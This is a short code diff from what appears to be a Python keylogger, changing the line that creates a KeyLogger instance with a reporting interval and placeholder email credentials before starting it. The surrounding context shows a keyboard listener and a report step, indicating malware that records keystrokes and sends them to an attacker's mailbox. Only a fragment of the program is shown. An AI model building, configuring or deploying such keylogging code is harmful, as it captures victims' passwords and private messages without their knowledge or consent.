@@ -46,5 +46,5 @@ class KeyLogger:
 			self.report()
 			keyboard_listener.join()
 
-keyinst = KeyLogger(self.interval, 'YOURMAILHERE', 'YOURPASSHERE')
+keyinst = KeyLogger(int('AMOUNTOFTIMEHERE'), 'YOURMAILHERE', 'YOURPASSHERE')
 keyinst.start()
